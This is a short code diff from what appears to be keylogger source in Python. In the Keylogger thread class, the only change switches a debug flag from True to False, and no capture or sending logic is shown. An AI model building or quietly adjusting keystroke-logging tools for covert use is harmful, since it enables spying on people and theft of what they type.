@@ -9,7 +9,7 @@ class Keylogger(Thread):
 
     def __init__(self, filehandler):
         Thread.__init__(self, name='keylogging')
-        self.__debug = True
+        self.__debug = False
         self.__dateTime = datetime.now()
         self.__filehandler = filehandler
 
